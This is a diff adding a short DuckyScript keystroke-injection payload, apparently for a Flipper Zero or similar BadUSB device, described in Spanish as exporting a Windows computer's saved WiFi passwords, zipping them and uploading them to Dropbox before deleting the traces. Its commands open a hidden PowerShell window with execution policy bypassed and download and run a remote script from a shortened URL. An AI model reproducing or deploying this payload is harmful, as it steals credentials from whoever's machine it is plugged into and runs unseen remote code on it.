@@ -1,0 +1,14 @@
+REM     Title: wifi-exfiltracion
+
+REM     Author:mrflippermen
+
+REM     Description: Este script de PowerShell exporta las contraseñas de las redes WiFi almacenadas en tu computadora, las guarda en archivos de texto, las comprime en un archivo ZIP y luego sube el archivo ZIP a Dropbox. Después de completar el proceso, los archivos temporales se eliminan.
+
+REM     See README.md file for more details.
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass $db='';irm https://goo.su/x3RyN | iex
+ENTER
